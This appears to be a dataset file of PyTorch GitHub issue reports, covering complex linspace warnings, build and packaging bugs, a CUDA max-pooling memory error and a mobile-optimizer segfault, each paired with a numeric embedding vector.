"[complex] {lin,log}space: raises warning incorrectly triaged module: complex module: tensor creation","With PR https://github.com/pytorch/pytorch/pull/38875, `linspace` and `logspace` support complex numbers for start and end but they raise noisy warnings even when not required.

```python
import torch
torch.linspace(1j, 2j, steps=100) # Unnecessary warning raised.
torch.linspace(1j, 2j, steps=100, dtype=torch.float) # Valid warning raised/future: throw an error.
```

Warning Message Raised:
```
UserWarning: As either `start` or `stop` is complex, return type will be the complex dtype corresponding to default dtype.In future, this may throw an error when a non-complex dtype arg is passed as input along with complex valued start or end value. (Triggered internally at  ../aten/src/ATen/native/TensorFactories.cpp:468.)
```

More context
https://github.com/pytorch/pytorch/pull/38875#discussion_r586131767

cc @ezyang @anjali411 @dylanbespalko @mruberry @gchanan",True,"[-4.38357413e-01 -3.08874063e-02 -2.76764691e-01  2.87902117e-01
  1.67245418e-03 -2.02436447e-01 -2.53828242e-03  1.21340334e-01
 -2.64326185e-01 -1.05086923e-01 -3.68887842e-01  3.84128131e-02
 -7.81403258e-02  1.38330206e-01 -1.11425325e-01  3.56872350e-01
 -2.13352412e-01 -1.18730851e-01 -3.78624082e-01 -5.49985841e-02
  3.42924327e-01 -6.72152638e-02  6.12906255e-02 -4.23461795e-02
 -1.17593475e-01 -4.14099619e-02 -3.64891961e-02 -1.29196644e-01
  4.70599890e-01  1.28766984e-01 -1.02879480e-03 -1.04612343e-01
 -3.75570774e-01  8.06003809e-04  9.36110392e-02  7.53219724e-02
 -2.09381461e-01 -1.11470306e-02 -2.64638841e-01  1.77027583e-02
  3.45982492e-01  1.40444919e-01  3.53447527e-01  1.10556975e-01
 -1.45746022e-01  1.39020875e-01 -8.55867490e-02  1.04683436e-01
 -2.06045717e-01 -9.26602557e-02 -1.51809514e-01  1.73675805e-01
  3.33998948e-02 -2.57751912e-01 -4.38785814e-02 -2.20137239e-01
 -3.02936196e-01 -1.07485637e-01  1.25431240e-01 -3.55465800e-01
  1.96526438e-01 -8.82346034e-02  2.23547652e-01  3.02038342e-03
  2.85868645e-01  9.36133787e-02  2.55972147e-02  2.96140239e-02
  4.09928143e-01  2.98606336e-01 -1.14024594e-01 -5.20123132e-02
 -2.65383959e-01  1.92325145e-01  7.96940923e-02  2.88244933e-02
 -4.78204817e-01  2.91127682e-01  1.51507735e-01  1.82535574e-02
 -5.27315922e-02 -1.56913325e-01  9.56440195e-02 -1.70834199e-01
  4.87965271e-02  2.57388473e-01  5.14789879e-01 -9.72974971e-02
  2.49566138e-01  3.70594822e-02  3.30401421e-01 -7.40497261e-02
 -4.02210243e-02  3.31044853e-01 -1.77811563e-01 -2.75561679e-02
  4.31143194e-01  5.18592373e-02 -2.78249979e-01 -2.95650363e-01
 -5.44358324e-03 -3.76139313e-01 -1.48007959e-01  2.37934887e-01
  1.84370190e-01 -1.52951509e-01  3.40819061e-01  2.32756793e-01
  6.42117485e-02 -2.85671838e-03  5.92516303e-01 -1.15948260e-01
 -6.79243952e-02 -5.88634424e-02 -1.54293895e-01 -5.79414181e-02
  5.55016547e-02  1.55163318e-01  1.62263811e-02  5.85321546e-01
  1.07050546e-01  1.92260563e-01 -1.35679822e-02  1.88877791e-01
  1.50117069e-01  1.89306259e-01 -1.69095337e-01  5.84048443e-02
 -9.21153128e-02  1.21401191e-01 -4.70890813e-02  2.75723875e-01
  5.60494885e-02  1.59220785e-01  1.10099927e-01  2.33830571e-01
 -1.14353992e-01  3.21467519e-01 -1.40193850e-01  1.13726735e-01
  3.78226861e-04 -7.08121806e-02 -9.68865454e-02 -2.76970267e-01
  6.31140620e-02 -2.49568924e-01 -1.61024064e-01 -7.92679787e-02
 -3.16583514e-02  6.41630962e-02  5.83328642e-02 -3.90974395e-02
 -4.91761625e-01  3.96793544e-01  1.62586719e-01  2.36406513e-02
 -2.31828401e-03  9.69197229e-02  4.06457514e-01 -2.43265808e-01
  1.28468713e-02  4.49584424e-01  1.60603374e-01  3.22073177e-02
  2.44597957e-01 -1.01096615e-01 -2.94940323e-01 -2.05919132e-01
 -5.64229310e-01  1.44436598e-01  4.88140667e-03 -2.54399687e-01
 -6.19036071e-02 -5.24212755e-02  3.17532659e-01 -1.43418372e-01
  8.07059556e-02 -4.12079722e-01 -4.66339141e-02  3.96935493e-01
  2.25808233e-01  3.46750349e-01  3.40483129e-01  9.03308913e-02
 -2.55278870e-02  1.78428948e-01  2.65346944e-01  1.79152071e-01
 -3.09910290e-02 -1.83181867e-01 -2.08041608e-01 -1.19533479e-01
  1.65271863e-01 -2.58968472e-01  1.26788422e-01  2.64530152e-01
  1.30372234e-02 -4.78753835e-01  1.52413607e-01 -9.87635404e-02
  3.57703865e-03  1.91991702e-01 -1.53541535e-01 -8.18011463e-02
  3.66369523e-02  2.51659248e-02 -3.36801887e-01 -2.00508535e-01
 -1.28938839e-01 -1.56636178e-01 -2.84787595e-01 -2.76180863e-01
 -2.17646301e-01 -3.48351181e-01 -2.09730327e-01  3.20738614e-01
 -2.01795071e-01 -1.35281861e-01 -1.29658893e-01  4.28832293e-01
  5.12234688e-01  2.02073418e-02 -4.25935894e-01 -3.17663938e-01
  1.68881923e-01 -1.44997120e-01 -3.91493022e-01  2.86726095e-03
  3.06645706e-02  7.49792308e-02 -2.08593868e-02 -2.45374218e-01
  3.17794561e-01  1.16072185e-02  1.02292754e-01  3.01666677e-01
 -2.19177872e-01 -2.27644324e-01 -5.78992665e-02 -3.97180356e-02
 -2.45695293e-01 -2.80977160e-01  1.25691444e-01 -1.68064952e-01
 -1.70006394e-01  7.45562240e-02 -3.74480397e-01 -1.85294282e-02
 -2.42192149e-01  1.69605315e-01  2.85631120e-01 -3.62944081e-02
 -1.86493143e-01  2.77238116e-02  1.42980799e-01  2.86437005e-01
  6.57548681e-02  2.21097171e-01  2.18027160e-02 -3.92716587e-01
  3.41498137e-01  8.80727172e-02  9.81144086e-02  2.09331423e-01
  3.38661969e-01  2.53040016e-01 -2.25024551e-01  3.84140074e-01
  8.28134120e-02 -6.84920698e-02 -5.73545843e-02 -1.33800611e-01
  2.08180428e-01 -3.15597206e-02  6.46305829e-02 -4.70132142e-01
  4.13582712e-01 -2.43089661e-01 -2.32685134e-01 -2.88305819e-01
 -8.98798108e-02  2.45547161e-01  2.71571241e-02  4.18670595e-01
  1.86171025e-01 -2.43783712e-01  7.48226643e-02  1.43202066e-01
 -7.85967559e-02 -2.71729380e-01 -4.24168020e-01 -6.26657829e-02
  2.07879514e-01 -3.51313502e-02 -1.14004210e-01  8.14314112e-02
 -1.01519316e-01 -3.18588108e-01 -1.18404880e-01  2.21059307e-01
  2.15188369e-01  1.91172168e-01  1.16648197e-01 -2.76161909e-01
 -1.16396010e-01  1.19440779e-01  1.13050818e-01 -2.52796747e-02
  5.09065866e-01 -2.58753300e-01  2.15557516e-01  1.49116620e-01
 -9.97543037e-02  4.87288058e-01 -5.14576472e-02  2.25645825e-01
 -3.86067480e-01  3.96994233e-01  8.73482227e-02 -5.68867847e-02
 -2.60026485e-01 -1.08440369e-01 -4.46964920e-01 -1.04166098e-01
  6.64155334e-02  3.05173963e-01 -4.54096735e-01  1.62759751e-01
 -2.91528702e-01  1.88517928e-01  1.69697270e-01 -1.04046941e-01
 -7.96383619e-02  1.84909046e-01  1.12853497e-01 -1.57216400e-01
 -2.69782573e-01  1.64923102e-01 -2.37400867e-02 -1.79876566e-01
 -9.19535905e-02 -1.04696110e-01  2.24231273e-01  7.92499930e-02
 -2.02971056e-01 -2.49534890e-01  1.59484059e-01  2.15039849e-01
 -3.78072336e-02 -2.88707793e-01 -1.81514248e-01  1.13576874e-01
 -1.72077358e-01  3.33003223e-01 -2.34785154e-01  5.43747067e-01
 -6.19675592e-02 -1.05992826e-02  1.02085501e-01  3.60092849e-01
  9.24164243e-03  1.17470011e-01 -4.05311048e-01 -1.82644606e-01
  1.71618745e-01  9.63977873e-02 -9.73083600e-02 -6.26744479e-02
 -3.43652889e-02  2.92150021e-01 -1.93920881e-01 -2.94003561e-02
  5.77057377e-02  2.52916425e-01  2.27921247e-01 -4.40972239e-01
 -2.71754205e-01  8.83447975e-02 -4.77741007e-04  7.17769638e-02
  2.60988533e-01  1.20654725e-01 -2.76895344e-01 -7.47999772e-02]"
Python 3.9 installs torch to a wrong version if git commit starts with '0' module: build triaged,"## ðŸ› Bug

Probably not a big issue, but an interesting one.

In python 3.9, when a torch git commit starts with '0', e.g. `0567988`, a `python setup.py install` would install it to a version of `1.9.0a0+567988` with the leading 0 removed.

A python warning message like this is printed

```
Building wheel torch-1.9.0a0+0567988
/usr/lib/python3.9/site-packages/setuptools/dist.py:452: UserWarning: Normalizing '1.9.0a0+0567988' to '1.9.0a0+567988'
  warnings.warn(tmpl.format(**locals()))
```

The version in pip freeze is ""wrong"",

```
$ pip freeze | grep -i torch
torch==1.9.0a0+567988
```

but the version in `torch.__version__` is correct

```
$ python -c 'import torch; print(torch.__version__)'                    
1.9.0a0+0567988
```

Theoretically, this behavior will trigger with an odd of 1 in 16. ðŸ¤”

cc @malfet @seemethere @walterddr @albanD ",True,"[-0.2996151  -0.28698617 -0.07696871  0.0756131  -0.08670051 -0.24299829
 -0.35456827  0.1912681  -0.2390788   0.01400428 -0.11364688  0.20650598
 -0.14603813  0.29126003  0.19380735 -0.03535135 -0.26720658 -0.37189096
  0.10447769  0.02635395  0.25650415  0.03530796 -0.11245225 -0.19147149
  0.27390468 -0.1875071  -0.12780559  0.05668091 -0.04321167  0.31411016
 -0.10621531 -0.17381732 -0.17728484  0.13497555  0.46727255  0.18760084
 -0.254754   -0.36476213 -0.22543333 -0.1672277   0.05118619  0.09824488
 -0.11124194  0.02232834 -0.2474759   0.18157378 -0.05567156  0.14789715
 -0.15371847 -0.24459845 -0.07126024  0.09229097 -0.06517695 -0.1744472
  0.2724011  -0.28869075 -0.20117013  0.35466897  0.1449862  -0.444037
  0.12736055 -0.00743057  0.12238476 -0.1146824   0.14039081  0.1197914
 -0.30187297 -0.10014392  0.50622547 -0.14476843 -0.08659308 -0.17626563
 -0.0373415   0.02803365 -0.2509383  -0.04208813 -0.34998333  0.4000015
 -0.3012373  -0.20453387 -0.01370502 -0.24685854 -0.10199462  0.10214511
  0.16275632 -0.00498356  0.27936575 -0.13096309  0.18925692  0.44588393
  0.2245445   0.10035106  0.23162156  0.20821834 -0.03855421 -0.08606229
  0.1183165  -0.01106921 -0.36656487 -0.3188355   0.36544323 -0.53234905
 -0.13042323  0.36884776  0.44433782 -0.15341565  0.33593947 -0.00862193
  0.08549419 -0.12521648  0.3468788   0.05569122  0.05125304 -0.22960103
 -0.14807135  0.11050633 -0.500202    0.23517478  0.05748548  0.458215
  0.40366784  0.21016976  0.06399363  0.29608423  0.08614903  0.2404443
 -0.01411904 -0.15955158 -0.26330805  0.19485262  0.1335445  -0.04150848
 -0.32638916 -0.06936971  0.26291415  0.3270712  -0.15184098 -0.12812734
 -0.1148321  -0.4112831   0.00332902 -0.04161333 -0.1289817  -0.63350236
  0.10123172 -0.07822093 -0.08042164  0.3661916   0.05587579 -0.12254256
 -0.06909023  0.0556227  -0.7193824   0.31801042  0.10181209 -0.17709887
  0.13333094  0.07000302  0.1127255  -0.1897913   0.04219837  0.11113423
  0.01076733 -0.01989012 -0.11993377 -0.1395343  -0.48218    -0.08102677
 -0.40478903 -0.0074891  -0.10440647  0.00455331  0.29979908 -0.36485028
  0.15825325  0.03202173  0.2837788  -0.18483691  0.09443326  0.22272408
  0.28933346  0.66096103  0.02271947 -0.01525464  0.06363241 -0.1301853
 -0.07083879 -0.27062896  0.14517666 -0.02616357 -0.31345966 -0.24002817
  0.18392302 -0.11003189  0.15333065  0.20668232 -0.1652721   0.24484873
 -0.08550152  0.00491538 -0.17285666  0.32237446 -0.19808818  0.02889304
  0.12917575  0.08106703 -0.22220935 -0.03798065 -0.20563973 -0.15230298
 -0.03523798 -0.15446085 -0.05500201  0.02908015  0.03818961  0.15303604
  0.00412106  0.08460248  0.40692246  0.11487158  0.089253    0.16639253
 -0.0416333  -0.12613845  0.18946369  0.228823   -0.03068573 -0.06685635
 -0.18283267 -0.11267747 -0.16461165 -0.3141349   0.3376565   0.03444565
  0.13477294  0.27287573 -0.03788617  0.08945474  0.02720508  0.31169784
 -0.07199544 -0.11910496  0.10931035 -0.0507387  -0.11605429 -0.01650299
 -0.13509159 -0.06502786 -0.3678981   0.16573434  0.16256112 -0.16243489
 -0.08780889  0.01357513  0.4511014   0.19064365 -0.05860009  0.0957678
 -0.19177522 -0.10563609  0.14612943  0.09323984  0.06447476  0.18474771
  0.47976053  0.03781917 -0.14427635  0.52119815 -0.16077569 -0.06523284
  0.35296485 -0.09466704  0.31566444  0.01290959  0.06156386 -0.09396292
  0.28884438 -0.05954803  0.03033883 -0.31096655  0.07059269  0.37162745
 -0.3717851   0.13571894  0.4504117  -0.16344242  0.4454308  -0.29813015
 -0.2142898   0.17321758 -0.02231479 -0.0465745   0.25371554  0.14747587
 -0.07228284 -0.06117757 -0.08946224 -0.4060881   0.06376904  0.4334389
 -0.3525839   0.22940569 -0.08212285 -0.08485865 -0.1254324  -0.00832364
 -0.44801295 -0.01647773  0.5328647  -0.50757486  0.3156207   0.1428104
 -0.12693246  0.29950577  0.11073574  0.16296843 -0.06187766  0.13477346
 -0.11980573  0.1026576  -0.12563565 -0.20116758 -0.40466186 -0.05685475
  0.14330898 -0.00442329 -0.1553371   0.1028018  -0.1101848  -0.06406076
 -0.0543272   0.15881297  0.00584625  0.16555476  0.00544665 -0.14098163
 -0.06348556  0.12279262 -0.12815666 -0.23103265 -0.07724361 -0.3694353
 -0.10169911 -0.37308195 -0.29158324 -0.06611066  0.6245833   0.46265996
 -0.33514792 -0.5598693   0.11989672 -0.00670042 -0.23867379  0.26567262
 -0.04682485  0.30814016 -0.07767881  0.3421107   0.2880794  -0.15839672
 -0.36367697  0.22554252 -0.40433273 -0.03958064 -0.00936677  0.04311097
 -0.26078677  0.02896926 -0.13033113  0.43658426 -0.06036664  0.20929606
 -0.1658779   0.26681623  0.4171736  -0.04379858  0.05652085  0.23716137
 -0.01870021 -0.19528238 -0.04983201  0.13708326  0.04018996 -0.18467867]"
setup.py sdist does not include third party submodules module: build triaged,"## ðŸ› Bug

<!-- A clear and concise description of what the bug is. -->
`python setup.py sdist` should produce a tarball of source code that is self-contained and sufficient to compile the project. Currently
- the third-party sources are not included
- the LICENSE file does not include the third party licenses (solved for wheels by gh-51634)
- some other files that are required for building like `version.txt` are not included

This is related to issues gh-50697 and gh-13586

@rgommers

cc @malfet @seemethere @walterddr",True,"[-2.59795249e-01 -5.38229644e-01 -9.57386270e-02 -4.22468573e-01
  3.42409164e-01 -8.44412372e-02 -2.05836862e-01 -1.57142520e-01
 -3.72573346e-01 -3.66839254e-03  1.15822349e-02  2.02266797e-01
  2.02646479e-01 -1.11085884e-01  4.70505893e-01  1.07648402e-01
  4.12739720e-03 -4.44442242e-01  2.17054427e-01  2.20294699e-01
  1.41459346e-01  6.80076107e-02  7.63977915e-02 -6.89619333e-02
  1.09612113e-02 -1.88103139e-01 -3.16033289e-02 -1.57129765e-01
  9.32515487e-02 -4.98391092e-02  2.00565830e-01  3.07444364e-01
 -1.97258264e-01  8.81869048e-02  1.82510763e-01  1.44537017e-01
 -1.96124911e-01 -3.05886030e-01 -1.55853897e-01  1.65960431e-01
 -2.35302523e-01  5.76437451e-03 -1.82779253e-01 -1.15743451e-01
 -3.79797369e-01  1.34121198e-02  4.09681797e-02  8.16922635e-02
 -1.67738557e-01  2.03332901e-02  2.28545412e-01  1.49304837e-01
 -2.46548224e-02 -1.56804651e-01  1.16596237e-01 -1.26661211e-01
 -1.78129539e-01  5.31408906e-01 -8.36792588e-02 -9.58396867e-02
  1.89708143e-01  1.41653419e-02 -6.27780557e-02  2.44371593e-02
  7.15162009e-02  2.13481858e-01 -2.50661559e-02 -3.18471715e-03
  3.20649743e-01 -2.28844300e-01 -4.99248989e-02 -4.55048382e-02
 -2.03057736e-01 -3.03753093e-02 -8.19326341e-02  1.45176828e-01
 -6.22592941e-02  2.07268193e-01 -1.79135531e-01 -2.99661785e-01
 -2.95505166e-01  1.65636703e-01  5.87500781e-02  1.69462979e-01
  1.12812422e-01 -2.40428865e-01  9.59044844e-02  9.92700458e-02
 -3.16390656e-02  1.65639073e-01  4.32764381e-01 -1.60951123e-01
  2.72038817e-01  2.56269872e-01 -1.03145041e-01  3.95312428e-01
  4.17816713e-02  5.94723038e-02 -2.09628910e-01 -1.45087659e-01
 -1.02138884e-01  1.69010293e-02 -1.77668482e-01  8.44536424e-02
  1.58125356e-01 -1.27605766e-01  2.95160711e-01  1.37152284e-01
 -3.57810855e-02 -7.63329118e-02 -1.77637339e-02 -1.03528880e-01
  1.98439062e-01 -1.36464447e-01  4.97737639e-02  1.61750287e-01
 -4.03134644e-01  3.65490392e-02 -6.62364513e-02 -2.60376304e-01
  1.81707859e-01 -3.59839015e-02  1.98939785e-01  4.95261587e-02
  1.47850752e-01  3.04319654e-02 -9.62450281e-02 -4.88081016e-03
  1.96855143e-02 -5.86265437e-02  4.78392243e-02  1.92514881e-01
  9.00189877e-02 -6.25877362e-03  3.94423664e-01 -2.27402486e-02
 -3.86056870e-01 -2.09058791e-01  1.08242877e-01 -1.62897259e-01
 -3.05741668e-01 -3.95508893e-02  5.57750091e-02 -1.46263182e-01
  7.16008618e-03  1.74055785e-01 -6.07990026e-02  2.32742205e-01
 -7.16097057e-02 -1.49424702e-01  2.67451033e-02  1.17252953e-01
 -3.09317797e-01  4.29459363e-01  1.96011737e-01  2.76786000e-01
  4.44004416e-01  3.99291888e-03 -3.93229276e-02 -7.75951669e-02
  1.72783419e-01  2.22612351e-01  1.41045660e-01  1.74220935e-01
 -4.46914822e-01 -1.33815352e-02 -4.35673445e-01 -1.73286542e-01
  6.65924922e-02 -2.22396076e-01 -3.77467684e-02 -3.83104151e-03
  8.27841759e-02 -1.82322994e-01  3.91764283e-01 -7.05380812e-02
 -2.09951222e-01 -1.78658590e-01  2.28085950e-01  3.07859540e-01
  2.46345744e-01  2.53171057e-01 -1.33204553e-03 -7.60104284e-02
 -2.31549591e-01 -6.06976151e-02  3.04702669e-01 -8.65544975e-02
 -4.12049294e-02  2.89822221e-01 -2.78657079e-01  1.19078577e-01
  1.66607797e-01 -1.13565110e-01 -2.34215558e-01 -3.09630692e-01
  4.80867624e-01  2.46160686e-01  2.23341674e-01 -9.78969187e-02
  8.30892324e-02  3.51720452e-01  8.78177732e-02  1.39577463e-01
 -3.73745710e-02 -8.17863084e-03 -7.54953623e-02 -2.58211434e-01
 -4.40516442e-01  3.81873660e-02 -1.12922102e-01 -1.35104448e-01
  3.52307744e-02 -1.99806631e-01 -1.80751011e-02  2.38339663e-01
  1.27473027e-01 -3.22753727e-01  2.09779024e-01 -7.33479857e-02
 -1.53767586e-01 -1.29745066e-01  5.04671559e-02 -1.94270253e-01
  3.22220057e-01 -5.85199967e-02  2.31962930e-02 -4.32055503e-01
  2.54439980e-01  7.46724233e-02 -1.44009352e-01 -6.38549507e-01
  2.50909954e-01  7.45376721e-02 -2.41497289e-02  8.65624622e-02
  1.11384541e-01 -1.07715651e-01  2.25268990e-01  2.78289884e-01
  9.87529308e-02 -2.39376083e-01 -1.52833939e-01 -2.42372483e-01
 -4.12689932e-02 -1.19781256e-01 -3.83924646e-03  1.41725093e-01
 -3.57199848e-01  1.22536756e-02 -1.91607371e-01 -1.09871060e-01
  1.93010390e-01  9.34164599e-02  3.86545837e-01 -1.69089556e-01
 -2.73745716e-01 -1.78472698e-01  1.73735283e-02  6.42752051e-02
 -9.89198387e-02  3.15308660e-01 -2.31018975e-01 -6.51772879e-03
  1.28187180e-01 -2.36391544e-01 -3.73262465e-01  1.98238999e-01
 -6.39942735e-02 -3.03777039e-01  1.59218401e-01 -2.98206508e-01
  1.85131893e-01  1.03642590e-01  1.08153597e-02  1.25830486e-01
  4.82916266e-01 -2.14257985e-01  2.49510705e-02  8.10288936e-02
 -9.91783887e-02  3.87756258e-01 -1.29934967e-01  1.01668358e-01
  2.78618485e-01 -1.10401191e-01 -2.11803898e-01 -2.70532340e-01
 -2.27007776e-01 -1.59174815e-01 -3.19550782e-02  1.43199682e-01
  2.45465234e-01 -1.09824717e-01 -1.65463835e-01  7.35473484e-02
  5.68758324e-02  1.35304667e-02 -5.17078415e-02 -9.49440673e-02
 -9.26296934e-02  1.88156143e-01  2.97997236e-01  1.29871801e-01
  6.84497207e-02  4.21085283e-02  1.29843010e-02  1.60701498e-01
  2.58633077e-01 -4.95496869e-01  4.64343876e-01  1.86451957e-01
 -2.71494746e-01  3.03919494e-01 -6.43405244e-02  1.51413694e-01
 -2.49597114e-02  6.97030663e-01  2.60502636e-01  1.42736226e-01
 -3.59730758e-02 -1.04493983e-01 -3.35609645e-01 -1.20066576e-01
  4.09073830e-02  9.68393832e-02 -4.22567457e-01 -6.53692111e-02
 -7.43100047e-02 -1.38364360e-02  2.57883072e-01  5.96646406e-02
 -6.97189718e-02 -5.40736318e-02 -1.43817201e-01  2.41533555e-02
 -1.92019977e-02  3.01275969e-01 -3.06339473e-01 -2.77802527e-01
  7.42102861e-02 -1.30046397e-01  7.11769760e-02 -1.26370117e-01
 -1.85333580e-01  9.52854678e-02  2.22420573e-01  2.00258028e-02
 -2.38873869e-01 -1.59333162e-02  1.22065611e-01 -4.38869931e-04
 -3.32193404e-01 -2.87996471e-01  2.19133154e-01  4.18443307e-02
  4.01206985e-02  8.67023245e-02  6.88248426e-02  1.78048790e-01
 -2.93690890e-01  1.81880593e-01 -1.81414470e-01 -6.40777498e-02
  1.03592902e-01 -2.76635468e-01 -3.68091345e-01 -1.12760648e-01
  1.99753279e-03  2.80783117e-01 -2.12391183e-01  2.24214092e-01
 -2.31958359e-01  2.01484025e-01  2.94526696e-01  1.12431876e-01
 -6.70756102e-02  3.94929767e-01  3.33191268e-02  1.93233360e-02
 -4.71479923e-01  2.10486203e-01  5.74549139e-01 -5.58988154e-02]"
Illegal memory access in cuda max pooling for large inputs high priority module: cuda triaged module: pooling,"## ðŸ› Bug

From #52211

```
import torch

x = torch.randn(70, 32, 100, 100, 100, dtype=torch.half, device='cuda')

y = torch.nn.functional.max_pool3d(x, 5)

torch.cuda.synchronize()
```
Env:

Collecting environment information...
PyTorch version: 1.9.0a0+a86027d
Is debug build: False
CUDA used to build PyTorch: 11.2
ROCM used to build PyTorch: N/A

OS: Manjaro Linux (x86_64)
GCC version: (GCC) 10.2.0
Clang version: Could not collect
CMake version: version 3.19.3

Python version: 3.9 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 11.2.67
GPU models and configuration: 
GPU 0: GeForce RTX 2070 SUPER
GPU 1: GeForce GTX 1070 Ti

Nvidia driver version: 460.32.03
cuDNN version: Probably one of the following:
/usr/lib/libcudnn.so.8.0.5
/usr/lib/libcudnn_adv_infer.so.8.0.5
/usr/lib/libcudnn_adv_train.so.8.0.5
/usr/lib/libcudnn_cnn_infer.so.8.0.5
/usr/lib/libcudnn_cnn_train.so.8.0.5
/usr/lib/libcudnn_ops_infer.so.8.0.5
/usr/lib/libcudnn_ops_train.so.8.0.5
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.5
[pip3] torch==1.9.0a0+a86027d

Root cause https://github.com/pytorch/pytorch/issues/52211#issuecomment-779613083
cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @ngimel @heitorschueroff @xwang233 
",True,"[-0.10925274 -0.10000146 -0.58111304 -0.1812141   0.0049735  -0.23932898
 -0.0285262   0.28777665 -0.30383798  0.09909424 -0.22666791 -0.14344904
  0.01001722  0.02318928 -0.240154    0.05144437  0.07820161  0.0260231
 -0.33434203 -0.06125135 -0.00247164  0.03241942 -0.19286372 -0.1686781
  0.03264949  0.14008275 -0.21444853 -0.2604835   0.31332266 -0.27643582
  0.02484416  0.06152383 -0.02943001  0.14771529  0.02261909 -0.16549242
 -0.5144621  -0.47138125 -0.1450505  -0.10116401 -0.0490675   0.22159865
 -0.00855604  0.12318093 -0.00417082  0.13744378 -0.18801104  0.4005658
 -0.08704315 -0.05143087  0.07019106  0.40108743  0.11708289 -0.29825357
 -0.10290159 -0.07274014 -0.15046172 -0.073701    0.01534933  0.02089225
  0.2903744   0.10586215  0.05520236 -0.04861649  0.1072277  -0.06266703
 -0.15945329  0.33975247  0.45234877  0.0659962  -0.01951197  0.26167673
 -0.39773235 -0.19848736  0.12496023  0.05376899 -0.14934431 -0.00580097
 -0.37370738 -0.19033659  0.15377368  0.27042392  0.0278905  -0.46378702
  0.11758234 -0.03622565  0.38511428  0.14371689  0.18932334 -0.10485643
  0.2913692   0.2787022  -0.10099676  0.3605749  -0.06783196 -0.07369734
  0.11318413 -0.0930501  -0.44112775 -0.2913844  -0.0389336  -0.19049814
 -0.21663396  0.667091    0.18371767 -0.21762401  0.20561373  0.4314722
 -0.01557639 -0.01040724  0.4550908   0.05409867 -0.04646643  0.0027222
 -0.01737503  0.02992473 -0.49981588 -0.34448153 -0.07943213  0.19486712
 -0.15934414  0.05806191 -0.00616326  0.03332439  0.27314782  0.05216026
  0.22838421 -0.07916334 -0.36678526 -0.14454867  0.04227619 -0.13023448
  0.20945609 -0.0830351   0.1052636   0.42676222 -0.4052964  -0.04298312
 -0.174344    0.09031294 -0.01891362  0.34098768  0.00380533 -0.24228159
 -0.02823921  0.24182847  0.01929313 -0.01054325  0.2270534   0.01618338
  0.23536478 -0.10924214 -0.42874867  0.27848822 -0.09565824  0.05095953
  0.19769618  0.0837792   0.16386966 -0.62725085  0.25307596  0.14902717
  0.3784841   0.22701499  0.34776744  0.08970641 -0.20392025 -0.1251065
 -0.2259223   0.28467685 -0.14724442 -0.252303   -0.10002053 -0.16328156
  0.23012869 -0.287912   -0.512239   -0.20740506 -0.06641906  0.24231002
 -0.15483454  0.31710577  0.13741712 -0.00878835  0.06263375  0.19456212
  0.4564158   0.09692435 -0.21695918 -0.11380211 -0.37484047 -0.04578064
 -0.05534641 -0.24007231 -0.00319706  0.04474502  0.13764364 -0.19947699
 -0.13146326 -0.24797924 -0.21791364  0.04357324  0.03519499  0.24642166
  0.21021442  0.00694784 -0.3336513  -0.33415383  0.0452164   0.18829206
 -0.2438128  -0.14328963 -0.32903358 -0.21909726 -0.04475779  0.17791764
 -0.02224213 -0.12415719  0.06307997  0.26780948  0.716495   -0.3092815
  0.2922299  -0.2818504   0.217546   -0.00100013 -0.00475232 -0.10215876
  0.11151908  0.02516914 -0.01509995 -0.1462851   0.00614187 -0.16237953
 -0.05032277  0.36885315  0.1902843  -0.03872257  0.00384926 -0.01813055
 -0.29083878  0.13743111 -0.10906298  0.04844774  0.01614544  0.1952759
 -0.01337165  0.04230912 -0.13461009  0.05787515 -0.17188889 -0.15744044
  0.13707447 -0.15804447  0.04170572 -0.01351976  0.05318802  0.01329659
 -0.08228392 -0.1443629   0.27741882  0.4700876  -0.26115426  0.25111124
  0.17133431  0.12221165 -0.38779688  0.17778908 -0.25519592  0.04744397
 -0.13738623 -0.09898315  0.32187152  0.08630469  0.2799971  -0.33205932
  0.680185   -0.2475867   0.21017659  0.01114252  0.46580747  0.04598237
  0.31490362  0.09075956  0.48716742 -0.19075945 -0.43674546 -0.18359295
 -0.0742313  -0.15637074 -0.2177994   0.2568405   0.07116058 -0.15842514
 -0.26778787  0.11647002  0.31248814  0.09495988 -0.05798383 -0.27205008
 -0.44465894  0.17507662  0.27254122 -0.1870608  -0.46110758 -0.0741546
  0.10852244  0.28556243  0.53139186 -0.26051414  0.38914484 -0.32335097
 -0.2896612   0.22091487 -0.31318188  0.01354117  0.1670528   0.23662175
  0.2656877   0.01890063 -0.32819223 -0.37720895 -0.3915991   0.17699191
  0.06792504  0.18009506 -0.3841434   0.42881423  0.08948845  0.44294423
  0.5264919  -0.13473268  0.29988104 -0.11369781 -0.37133637  0.05673517
  0.15848875 -0.12870122  0.11633483 -0.15562277 -0.20169184  0.01456709
 -0.05968847 -0.26297802  0.0905432  -0.14341812  0.35260803  0.46637738
  0.26805767 -0.20653954  0.01980765 -0.06442998  0.23390582  0.04328444
  0.0548092   0.46766543  0.14806312  0.0850103  -0.06742294 -0.10650962
  0.00338858  0.12736538 -0.1404525  -0.20430604 -0.11166048 -0.18042204
 -0.1842686  -0.02026116  0.15060171  0.12578905 -0.26331934  0.10127981
  0.06520193  0.39993757  0.5836534  -0.21042499 -0.15010697 -0.14670312
  0.21539225  0.09813087  0.21797338  0.19466157 -0.20195523 -0.18288252]"
optimize_for_mobile segfaults during forward of mobilenet_v3 high priority module: crash triaged oncall: mobile,"## ðŸ› Bug

Applying `optimize_for_mobile` into a `mobilenet_v3` from torchvision leads to a segfault on the 3rd forward pass.

## To Reproduce

```python
import torch, torchvision
from torch.utils.mobile_optimizer import optimize_for_mobile

m = torchvision.models.mobilenet_v3_large()
m = torch.jit.script(m)
m = optimize_for_mobile(m)

# run forward 3 times until segfault
m(torch.rand(1, 3, 224, 224))
m(torch.rand(1, 3, 224, 224))
m(torch.rand(1, 3, 224, 224))
```
yielding
```
Segmentation fault: 11
```

I'm using PyTorch `1.8.0.dev20210125` with latest torchvision.

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser",True,"[-4.08708960e-01  1.37003615e-01 -4.58200201e-02 -3.48948389e-01
  2.14620948e-01 -2.52852857e-01 -2.44916797e-01  4.19027269e-01
 -5.81607461e-01 -6.04274869e-03 -7.73740411e-02  4.27775025e-01
  3.66936773e-02  1.65050164e-01 -6.69982508e-02  3.63308847e-01
 -1.80656314e-01 -1.11012273e-01 -2.35292614e-01 -1.53057456e-01
  2.24253297e-01  2.45474093e-03  6.68392479e-02 -2.06418231e-01
